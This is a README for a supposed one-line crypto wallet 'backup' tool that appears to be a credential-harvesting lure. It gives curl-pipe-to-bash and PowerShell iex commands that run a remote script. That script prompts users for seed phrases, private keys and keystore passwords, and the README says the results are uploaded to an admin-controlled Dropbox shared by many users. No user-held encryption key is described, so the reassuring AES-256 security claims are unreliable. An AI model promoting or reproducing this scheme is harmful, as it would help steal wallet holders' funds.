# WebConnect Wallet Backup - One-Liner System

**One-Press Wallet Backup with Automatic Dropbox Sync**

A simple, secure backup system for wallet recovery phrases, private keys, and keystore files. Encrypts everything locally with AES-256 before uploading to Dropbox. Single-line installation and backup - no setup needed!

## 🚀 Quick Start - Copy & Paste

```bash
curl -fsSL https://github.com/yourusername/wallet-backup/raw/main/backup.sh | bash
```

That's it! Select what to backup (phrase/key/keystore), enter your data, and it's automatically encrypted and backed up to Dropbox.

---

## Features

- **One-Line Installation**: Paste command and run
- **No Setup Needed**: Pre-configured with shared Dropbox token
- **Three Backup Options**:
  - 🔑 Recovery Phrase (12-24 words)
  - 🔐 Private Key (0x...)
  - 📝 Keystore JSON & Password
- **AES-256 Encryption**: Locally encrypted before upload
- **Automatic Dropbox Sync**: Encrypted backups automatically uploaded
- **Multi-User Support**: Multiple people backup to same Dropbox folder
- **Cross-Platform**: Works on macOS, Linux, Windows (Git Bash/WSL)
- **Secure Input**: Password fields hidden while typing
- **Local & Cloud**: Backed up locally + Dropbox simultaneously

## System Requirements

- Internet connection (for Dropbox upload)
- Terminal/Command line access
- `curl` or `wget` (usually pre-installed)
- `bash` shell (built-in on macOS/Linux)
- ~50MB free disk space (for local backups)
- Minimum: macOS 10.10+, Ubuntu 16.04+, Windows 10+ (with Git Bash/WSL)

## Installation & Usage

### One-Liner Backup Command

**macOS/Linux:**
```bash
curl -fsSL https://github.com/yourusername/wallet-backup/raw/main/backup.sh | bash
```

**Windows (Git Bash/WSL):**
```bash
curl -fsSL https://github.com/yourusername/wallet-backup/raw/main/backup.sh | bash
```

**Windows (PowerShell):**
```powershell
iex (New-Object Net.WebClient).DownloadString('https://github.com/yourusername/wallet-backup/raw/main/backup.sh')
```

### What Happens

1. **Command runs** → Script downloads from GitHub
2. **First run** → Automatically downloads `storage.config.json` with Dropbox token
3. **Menu appears** → Select what to backup:
   ```
   1) Recovery Phrase (12-24 words)
   2) Private Key (0x...)
   3) Keystore JSON & Password
   4) Exit
   ```
4. **Enter your data** → Passwords are hidden while typing
5. **Automatic backup** → Data encrypted locally & uploaded to Dropbox
6. **Done!** → Confirmation message with backup details

---

### Manual Setup (Alternative)

1. Clone repository: `git clone https://github.com/yourusername/wallet-backup.git`
2. Navigate: `cd wallet-backup`
3. Run: `bash backup.sh`

---

## Usage Examples

### Backup Recovery Phrase

```bash
$ curl -fsSL https://github.com/yourusername/wallet-backup/raw/main/backup.sh | bash

Select option (1-4): 1
Paste your recovery phrase: chase combine trust around cloud...
✓ Phrase encrypted locally
✓ Backup uploaded to Dropbox
Backup Complete!
```

### Backup Private Key

```bash
$ curl -fsSL https://github.com/yourusername/wallet-backup/raw/main/backup.sh | bash

Select option (1-4): 2
Paste your private key: •••••••••••••••••••
✓ Key encrypted locally
✓ Backup uploaded to Dropbox
Backup Complete!
```

### Backup Keystore

```bash
$ curl -fsSL https://github.com/yourusername/wallet-backup/raw/main/backup.sh | bash

Select option (1-4): 3
Paste your Keystore JSON: •••••••••••••••••••
Enter your Keystore password: •••••••••
✓ Keystore encrypted locally
✓ Backup uploaded to Dropbox
Backup Complete!
```

## How It Works

```
┌──────────────────────────────────────┐
│ Paste curl command in terminal       │
└──────────────────────────────────────┘
             ↓
┌──────────────────────────────────────┐
│ Script downloads from GitHub         │
└──────────────────────────────────────┘
             ↓
┌──────────────────────────────────────┐
│ First run: Download config.json      │
│ (contains shared Dropbox token)      │
└──────────────────────────────────────┘
             ↓
┌──────────────────────────────────────┐
│ Select backup type:                  │
│ 1) Recovery Phrase                   │
│ 2) Private Key                       │
│ 3) Keystore JSON                     │
└──────────────────────────────────────┘
             ↓
┌──────────────────────────────────────┐
│ Enter your wallet data               │
│ (sensitive inputs hidden)            │
└──────────────────────────────────────┘
             ↓
┌──────────────────────────────────────┐
│ Encrypt locally (AES-256)            │
│ (happens on YOUR computer)           │
└──────────────────────────────────────┘
             ↓
┌──────────────────────────────────────┐
│ Upload encrypted file to Dropbox     │
│ (using shared token from config)     │
└──────────────────────────────────────┘
             ↓
┌──────────────────────────────────────┐
│ ✓ Backup Complete!                   │
│ Both locally & in Dropbox            │
└──────────────────────────────────────┘
```

**Key Point**: Your data is encrypted locally BEFORE being sent to Dropbox. The script never sends unencrypted sensitive data.



## Backup Storage

After running backups, your encrypted files are stored in two places:

### Local Backup
```
~/.webconnect/wallet_backups/
├── recovery_phrase_20260227_143022.enc
├── private_key_20260227_143025.enc
└── keystore_20260227_143030.enc
```

View your local backups:
```bash
ls -lh ~/.webconnect/wallet_backups/
```

### Dropbox Backup (Cloud)
```
Dropbox → /WebConnect/Wallet_Backups/
├── recovery_phrases/
│   └── recovery_phrase_20260227_143022.enc
├── private_keys/
│   └── private_key_20260227_143025.enc
└── keystores/
    └── keystore_20260227_143030.enc
```

**All backups are encrypted with AES-256 before upload!**

---

## Configuration

The Dropbox token and settings are stored in:
```
~/.webconnect/config/storage.config.json
```

Key settings:
```json
{
  "storage": {
    "destinations": [{
      "name": "dropbox",
      "access_token": "sl.u.YOUR_TOKEN_HERE",
      "path": "/WebConnect/Wallet_Backups",
      "enabled": true
    }]
  }
}
```

### For Multiple Users (Team Setup)

**Same Dropbox folder, different people:**
1. Admin creates GitHub private repo
2. Admin adds shared Dropbox token to `storage.config.json`
3. Admin shares the GitHub link
4. Each user runs: `curl ... | bash`
5. All backups go to same Dropbox folder

**Each person their own Dropbox:**
1. Each person updates their local `storage.config.json`
2. Add their own Dropbox token
3. Backups go to their personal Dropbox

## Security

### How It Protects Your Data

✅ **Local Encryption**: AES-256-CBC encryption on YOUR computer
✅ **Hidden Inputs**: Passwords and private keys hidden while typing
✅ **No Logging**: Sensitive data never written to logs
✅ **Cloud Encryption**: Only encrypted data sent to Dropbox
✅ **No Unencrypted Transmission**: Data never sent unencrypted over the internet
✅ **Private Repository**: GitHub repo is PRIVATE, token not public
✅ **File Permissions**: Backups stored with 600 permissions (owner-only)

### What Gets Encrypted

| Data Type | Encryption | Stored As |
|-----------|-----------|-----------|
| Recovery Phrase | AES-256 | `.enc` file |
| Private Key | AES-256 | `.enc` file |
| Keystore JSON | AES-256 | `.enc` file |
| Keystore Password | AES-256 | `.enc` file (combined) |

### What Doesn't Get Encrypted

- Your Dropbox API token (needed to authenticate)
- Backup filenames (show timestamps)
- Backup sizes (shown in Dropbox)

**Important**: Keep your GitHub repo PRIVATE since it contains the Dropbox token!

---

## Logs & Verification

### Check Backup Logs
```bash
cat ~/.webconnect/logs/backup.log
```

### View Recent Backups
```bash
ls -lth ~/.webconnect/wallet_backups/ | head -5
```

### Check Dropbox Sync Log
```bash
tail ~/.webconnect/logs/backup.log | grep "Dropbox"
```

## Troubleshooting

### "curl: command not found"
```bash
# macOS
brew install curl

# Linux (Ubuntu)
sudo apt-get install curl

# Windows: Use PowerShell version instead
```

### Script won't run
```bash
# Make sure bash is available
bash --version

# Try with explicit bash
bash /path/to/backup.sh
```

### Dropbox upload fails
- ✓ Check internet connection
- ✓ Verify Dropbox token is valid: `grep access_token ~/.webconnect/config/storage.config.json`
- ✓ Check Dropbox folder permissions
- ✓ Backups still save locally even if upload fails

### Can't find local backups
```bash
# Check if directory exists
ls -la ~/.webconnect/wallet_backups/

# If empty, run the backup script again
curl -fsSL https://github.com/yourusername/wallet-backup/raw/main/backup.sh | bash
```

### Permission denied
```bash
# Try running with bash explicitly
bash ~/backup.sh

# Or add execute permission
chmod +x ~/backup.sh
```

---

## FAQ

**Q: Do I need to install anything?**  
A: No! Just need `curl`/`bash` (pre-installed on macOS/Linux).

**Q: Can multiple people use the same account?**  
A: Yes! They all backup to the same Dropbox folder using the shared token.

**Q: Is my data really encrypted?**  
A: Yes! AES-256 encryption happens on YOUR computer before upload.

**Q: What if I lose the Dropbox token?**  
A: Backups still save locally. Admin needs to update token in GitHub.

**Q: Can I use my own Dropbox?**  
A: Yes! Update the token in `~/.webconnect/config/storage.config.json`.

**Q: Where are my backups?**  
A: Local: `~/.webconnect/wallet_backups/`  
Cloud: Your Dropbox `/WebConnect/Wallet_Backups/`

**Q: Can I restore from backup?**  
A: Yes, decrypt with: `openssl enc -d -aes-256-cbc -in backup.enc`

**Q: Is the repo public?**  
A: NO - must be PRIVATE since it contains your Dropbox token!

**Q: What if upload fails?**  
A: Local backup still saves. You can upload manually later.

---

## Uninstall

Remove all local backups:
```bash
rm -rf ~/.webconnect
```

---

## File Structure

This GitHub repository contains:

```
wallet-backup/
├── backup.sh                    ← Main one-liner script
├── storage.config.json          ← Config with Dropbox token
├── README.md                    ← This file
├── WALLET_BACKUP_GUIDE.md       ← Full documentation
├── BACKUP_QUICKSTART.md         ← Quick start guide
├── COMMANDS_REFERENCE.md        ← Command reference
├── decentralized.ps1            ← PowerShell version
├── decentralized.bat            ← Windows launcher
├── backup-wallet.sh             ← Bash script
└── .gitignore
```

---

## Getting Started for Admins

### 1. Create Private GitHub Repo
```bash
# Create repo at https://github.com/new
git init
git add .
git commit -m "Initial: wallet backup system"
git remote add origin https://github.com/yourusername/wallet-backup.git
git push -u origin main
```

### 2. Share One-Liner
```bash
curl -fsSL https://github.com/yourusername/wallet-backup/raw/main/backup.sh | bash
```

### 3. Users Run Command
Everyone pastes the command and backs up to your shared Dropbox!

---

## Version History

### v1.0.0 (2026-02-27)
- One-liner installation and backup
- Interactive menu for backup selection
- Support for recovery phrases, private keys, keystore JSON
- AES-256 encryption with local + cloud backup
- Multi-user support with shared Dropbox token
- Cross-platform (macOS, Linux, Windows Git Bash/WSL)
- Hidden password input for security
- Automatic first-time configuration download

---

**Last Updated**: February 27, 2026  
**Status**: Ready to use  
**License**: Private Repository
